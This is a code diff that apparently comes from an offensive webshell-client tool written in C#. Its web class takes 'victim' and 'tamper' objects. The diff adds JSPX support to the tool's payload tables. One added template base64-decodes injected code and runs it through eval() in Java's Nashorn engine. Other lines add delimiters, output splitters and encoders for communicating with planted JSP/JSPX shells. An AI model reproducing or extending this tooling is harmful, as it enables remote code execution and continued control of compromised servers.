@@ -135,6 +135,13 @@ namespace Alien
                     _ => fnWrapJSP
                 }
             },
+            {
+                enLanguage.JSPX,
+                type => type switch
+                {
+                    _ => fnWrapJSP
+                }
+            }
         };
 
         /// <summary>
@@ -193,6 +200,13 @@ namespace Alien
             },
             {
                 enLanguage.JSP,
+                new string[]
+                {
+                    "<%", "%>",
+                }
+            },
+            {
+                enLanguage.JSPX,
                 new string[]
                 {
                     "<%", "%>",
@@ -275,6 +289,17 @@ namespace Alien
 
                     return null;
                 }
+            },
+            {
+                enLanguage.JSPX, (type) =>
+                {
+                    if (type == "Nashorn")
+                        return @"var bytes = java.util.Base64.getDecoder().decode(""[PATTERN]"");var codeStr = new java.lang.String(bytes, ""[ENCODING]"");eval(codeStr);";
+                    else if (type == "NebulaPulsar")
+                        return string.Empty;
+
+                    return null;
+                }
             }
         };
 
@@ -291,6 +316,7 @@ namespace Alien
             { enLanguage.Perl, "print \"[SPLITTER]\";" },
             { enLanguage.Ruby, "print \"[SPLITTER]\";" },
             { enLanguage.JSP, "echo(\"[SPLITTER]\");" },
+            { enLanguage.JSPX, "echo(\"[SPLITTER]\");" },
             //{ enLanguage.CFM, "writeOutput(\"[SPLITTER]\");" }
         };
 
@@ -301,7 +327,8 @@ namespace Alien
             { enLanguage.ASPX, clsEzData.fnszStre2b64 },
             { enLanguage.ASHX, clsEzData.fnszStre2b64 },
             { enLanguage.ASMX, clsEzData.fnszStre2b64 },
-            { enLanguage.JSP, szInput => szInput } // nop
+            { enLanguage.JSP, szInput => szInput }, // nop
+            { enLanguage.JSPX, szInput => szInput } // nop
         };
 
         public clsWeb(clsVictim victim, clsTamper tamper, clsSqlite sqlConn)
